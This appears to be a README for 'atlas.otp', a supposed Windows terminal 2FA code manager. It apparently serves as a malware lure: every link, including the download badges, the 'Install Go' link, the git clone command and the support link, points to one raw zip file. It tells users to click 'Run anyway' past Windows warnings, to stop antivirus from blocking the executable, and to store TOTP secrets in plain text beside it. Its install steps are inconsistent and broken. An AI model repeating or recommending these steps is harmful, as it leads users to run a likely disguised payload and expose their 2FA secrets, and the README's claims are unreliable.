# 🔐 atlas.otp - Simple Secure Terminal 2FA Manager

[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)

---

## 📋 About atlas.otp

Atlas.otp is a simple, easy-to-use program that helps you manage two-factor authentication (2FA) codes. It runs in your Windows terminal and displays your codes clearly, using a clean Onyx & Gold design that is easy on the eyes. With atlas.otp, you can view and copy your 2FA codes quickly and safely without extra software.

This program belongs to the Atlas Suite, a set of tools focused on security and simplicity. Atlas.otp works without needing a mouse or complicated menus—just your keyboard and a terminal window.

---

## 🚀 Getting Started

This guide will help you download and run atlas.otp on your Windows computer. You do not need any programming skills.

---

## 🎯 System Requirements

- Windows 10 or later
- 64-bit processor
- At least 100 MB of free disk space
- Command Line Interface (CLI) support (PowerShell or Command Prompt)
- Internet connection for initial download

Atlas.otp does not require installation beyond running the downloaded file. It works offline once started.

---

## 🔽 Download atlas.otp

Click the bright green button below to go to the official GitHub page, then follow the steps to get your copy.

[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)

This link will take you to the main repository page on GitHub. From there:

1. Go to the **Releases** section on the right or top menu.
2. Find the latest release.
3. Download the Windows executable file (`atlas.otp.exe`) from the assets list.

---

## 🛠️ Installation and Running

1. **Locate the downloaded file:** After downloading, open your `Downloads` folder or the folder you saved the file in.

2. **Run the program:**  
   - Double-click `atlas.otp.exe`.  
   - If Windows warns you, click **Run anyway** to continue.

3. **Open your terminal:**  
   Atlas.otp runs in a terminal window. It may open automatically after you run the file. If not:  
   - Press `Windows key + R`, type `cmd`, and press Enter.  
   - Navigate to the folder where you saved `atlas.otp.exe` using the command:  
     ```
     cd C:\path\to\folder
     ```
   - Then type:  
     ```
     atlas.otp.exe
     ```
   - Press Enter.

4. The program will launch with a dark Onyx and gold style interface showing your codes.

---

## 🔐 Using atlas.otp

- **Add your 2FA keys:**  
  atlas.otp reads your Time-Based One-Time Password (TOTP) keys to generate codes. Currently, you will need to edit a simple configuration file called `keys.txt` in the program folder. Add each key on a new line. The format looks like this:  
  ```
  ACCOUNT_NAME:BASE32_SECRET_KEY
  ```
  Example:  
  ```
  email@gmail.com:JBSWY3DPEHPK3PXP
  ```

- **View your codes:**  
  Open atlas.otp, and it will show the current codes for each account. Codes automatically refresh every 30 seconds.

- **Copy a code:**  
  Use the arrow keys to select an account. Press Enter to copy the code to your clipboard for easy pasting.

- **Exit the app:**  
  Press `Ctrl+C` or type `exit` and press Enter.

---

## ⚙️ Configuration File Details

The configuration file `keys.txt` is a plain text file found in the same folder as `atlas.otp.exe`.

- Each line must follow the format:  
  `LABEL:BASE32KEY`  
  Where LABEL is the account or service name, and BASE32KEY is the private TOTP key.

- Do not add extra spaces.

- Example file contents:  
  ```
  Gmail:JBSWY3DPEHPK3PXP
  GitHub:KRSXG5DSMFZXIYLZ
  Dropbox:JBSXG5TFOQXW4===
  ```

Make sure your keys are correct to generate valid codes.

---

## 🧰 Features

- Minimal interface designed to be easy to read in terminals.
- Supports multiple accounts.
- Auto-refresh and display of TOTP codes.
- Quick keyboard navigation.
- Secure: your keys stay on your device.
- Portable: no installation needed, just run the executable.
- Dark Onyx and Gold color theme for clarity and readability.

---

## 💡 Tips for Use

- Keep your keys backed up securely.
- Never share your `keys.txt` file or codes with anyone.
- Use a terminal with decent font size for best display.
- Restart atlas.otp if you edit `keys.txt` to load new keys.
- You can rename the executable but keep the file structure intact.

---

## 🛑 Troubleshooting

- If atlas.otp does not start, try running it from the terminal to see error messages.
- Make sure your Windows Defender or antivirus does not block the executable.
- If keys do not appear, check the format and location of the `keys.txt` file.
- For clipboard issues, run the terminal as administrator.

---

## 🔗 Useful Links

- [GitHub Repository and Download](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)
- [Atlas Suite Home](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)

---

## 🖥️ Advanced Use (Optional)

Advanced users can build the program from source using Go. This requires Go installed on Windows and some command line knowledge.

To build from source:

1. Install Go from https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip
2. Open PowerShell or Command Prompt.
3. Run:  
   ```
   git clone https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip
   cd atlas.otp
   go build -o atlas.otp.exe main.go
   ```
4. Run the created executable `atlas.otp.exe`.

This method gives you the latest code updates or lets you modify the app.

---

## 📁 File Structure

- `atlas.otp.exe` - The program file to run.
- `keys.txt` - Place your 2FA keys here.
- `README.md` - This guide.
- Other files relate to source code (for developers).

---

## 🔧 Support

For help and questions, use the GitHub Issues on the repository page:  
https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip

---

## 🚦 Security Notes

- atlas.otp works locally on your computer. It does not send your keys over the internet.
- Keep your keys and files private.
- Use strong, unique keys for each account.
- Regularly review your 2FA setup for best security.